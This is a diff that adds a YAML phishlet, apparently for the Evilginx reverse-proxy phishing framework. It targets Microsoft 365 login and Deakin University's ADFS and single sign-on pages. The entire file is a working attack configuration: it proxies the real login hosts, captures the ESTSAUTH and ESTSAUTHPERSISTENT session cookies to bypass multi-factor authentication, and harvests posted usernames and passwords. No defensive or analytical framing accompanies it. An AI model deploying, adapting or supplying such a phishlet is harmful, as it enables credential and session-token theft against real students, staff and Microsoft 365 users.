@@ -1,0 +1,30 @@
+name: 'o365'
+author: 'VSM97'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www.office.com', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
+  - {phish_sub: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'adfs.deakin.edu.au', orig_sub: 'adfs', domain: 'deakin.edu.au', session: true, is_landing: false}
+  - {phish_sub: 'adfs.deakin.edu.au', orig_sub: 'adfs', domain: 'deakin.edu.au:443', session: true, is_landing: false}
+  - {phish_sub: 'signon.deakin.edu.au', orig_sub: 'signon', domain: 'deakin.edu.au', session: true, is_landing: false}
+  - {phish_sub: 'signon.deakin.edu.au', orig_sub: 'signon', domain: 'deakin.edu.au:443', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'signon.deakin.edu.au', orig_sub: 'signon', domain: 'deakin.edu.au', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+credentials:
+  username:
+    key: 'j_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'j_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
